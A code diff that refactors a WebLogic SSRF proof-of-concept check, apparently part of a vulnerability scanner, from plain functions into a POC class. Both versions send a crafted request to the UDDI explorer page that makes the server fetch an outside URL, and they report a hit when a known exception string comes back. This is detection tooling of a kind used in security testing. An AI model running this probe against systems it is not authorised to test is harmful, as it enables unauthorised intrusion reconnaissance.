@@ -2,33 +2,28 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-import urllib.parse
-import requests
-requests.packages.urllib3.disable_warnings()
+from script import Script, SERVER_PORT_MAP
 
-def info(data=None):
-    info = {
-        "name": "weblogic ssrf",
-        "info": "weblogic ssrf.",
-        "level": "high",
-        "type": "ssrf"
-    }
-    return info
+class POC(Script):
+    def __init__(self, target=None):
+        self.server_type = SERVER_PORT_MAP.WEB
+        self.name = 'weblogic ssrf'
+        self.keyword = ['weblogic']
+        self.info = 'weblogic ssrf'
+        self.type = 'ssrf'
+        self.level = 'high'
+        Script.__init__(self, target=target, server_type=self.server_type)
 
-def prove(data):
-    data = init(data,'weblogic')
-    if data['base_url']:
-        url = data['base_url']+'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.baidu.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
-        try:
-            res = curl('get',url)
-            if "weblogic.uddi.client.structures.exception.XML_SoapException" in res.text :
-                data['flag'] = 1
-                data['data'].append({"page": '/uddiexplorer/SearchPublicRegistries.jsp'})
-                data['res'].append({"info": url, "key": "/uddiexplorer/SearchPublicRegistries.jsp"})
-        except:
-            pass
-    return data
 
-if __name__=='__main__':
-    from script import init, curl
-    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))
+    def prove(self):
+        self.get_url()
+        if self.base_url:
+            url = self.base_url+'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.baidu.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
+            try:
+                res = self.curl('get',url)
+                if "weblogic.uddi.client.structures.exception.XML_SoapException" in res.text :
+                    self.flag = 1
+                    self.req.append({"page": '/uddiexplorer/SearchPublicRegistries.jsp'})
+                    self.res.append({"info": url, "key": "/uddiexplorer/SearchPublicRegistries.jsp"})
+            except:
+                pass
